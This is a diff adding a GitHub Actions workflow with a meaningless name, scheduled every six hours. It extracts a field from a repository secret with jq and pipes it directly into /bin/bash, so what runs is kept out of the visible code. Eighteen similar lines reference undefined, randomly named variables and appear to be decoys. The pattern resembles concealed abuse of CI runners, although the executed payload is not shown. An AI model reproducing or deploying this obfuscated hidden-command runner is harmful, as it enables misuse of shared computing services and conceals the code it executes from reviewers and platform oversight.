@@ -1,0 +1,36 @@
+name: shangbaiyineng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shangbaiyineng
+        env:
+          hkdk019: ${{ secrets.hkdk019 }}
+        run: |
+          echo $hkdk019 | jq -r .lcm8786 | /bin/bash
+          echo $m4620 | jq -r .zej58441 | /bin/bash
+          echo $shnro50011 | jq -r .lxt98 | /bin/bash
+          echo $q775 | jq -r .ka1 | /bin/bash
+          echo $n81199 | jq -r .tfpm45405 | /bin/bash
+          echo $zamm1337 | jq -r .pkaw041 | /bin/bash
+          echo $o8 | jq -r .l57746 | /bin/bash
+          echo $p4421 | jq -r .mnaw1185 | /bin/bash
+          echo $xx1177 | jq -r .ixmvy23283 | /bin/bash
+          echo $d7456 | jq -r .ux19 | /bin/bash
+          echo $cpwdh637 | jq -r .nno832 | /bin/bash
+          echo $xrurc73 | jq -r .fszjp0 | /bin/bash
+          echo $a5374 | jq -r .z1 | /bin/bash
+          echo $w65859 | jq -r .v78 | /bin/bash
+          echo $uwuoy1142 | jq -r .d85607 | /bin/bash
+          echo $umhkm72763 | jq -r .km9796 | /bin/bash
+          echo $e9 | jq -r .i004 | /bin/bash
+          echo $rp44 | jq -r .sukex81 | /bin/bash
+          echo $xdqqu77 | jq -r .kkemi060 | /bin/bash
+
